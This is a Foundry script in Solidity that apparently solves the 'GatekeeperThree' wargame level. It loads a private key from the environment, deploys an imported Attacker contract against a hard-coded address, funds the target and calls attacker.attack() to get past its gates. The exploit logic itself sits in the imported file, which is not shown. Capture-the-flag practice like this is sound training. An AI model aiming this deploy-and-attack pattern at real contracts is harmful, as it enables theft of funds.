// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attacker.sol";

contract GatekeeperThreeScript is Script {
    address payable gatekeeperThreeAddress =
        payable(0xb1566837fC1CCe28cA06F129A2f00d4602161ce4);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(gatekeeperThreeAddress);
        GatekeeperThree gatekeeperThree = GatekeeperThree(
            gatekeeperThreeAddress
        );
        console2.log(gatekeeperThreeAddress.balance);
        console2.log(address(gatekeeperThree.trick()));
        console2.log(gatekeeperThree.allowEntrance());
        console2.log(gatekeeperThree.owner());
        gatekeeperThreeAddress.transfer(0.001000000001 ether);
        attacker.attack();
        vm.stopBroadcast();
    }
}
